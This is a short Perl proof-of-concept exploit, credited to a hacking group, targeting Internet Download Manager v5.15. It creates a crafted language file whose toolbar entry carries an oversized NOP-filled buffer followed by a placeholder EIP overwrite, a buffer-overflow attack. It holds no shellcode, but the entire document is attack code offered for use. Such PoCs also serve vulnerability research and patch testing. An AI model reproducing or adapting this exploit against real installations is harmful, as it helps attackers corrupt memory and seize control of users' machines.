#Internet Download Manager v.5.15 Build 3 (4 December)
#Works on Vista
#HellCode Labs || TCC Group || http://tcc.hellcode.net
#Bug was found by "musashi" aka karak0rsan
[musashi@hellcode.net]
#thanx to murderkey
$file="idm_tr.lng";
$lng= "lang=0x1f Türkçe";
$buffer = "\x90" x 1160;
$eip = "AAAA";
$toolbar = "20376=";
$packet=$toolbar.$buffer.$eip;
open(file, '>' . $file);
print file $lng;
print file "\n";
print file $packet;
close(file);
print "File has created!\n";
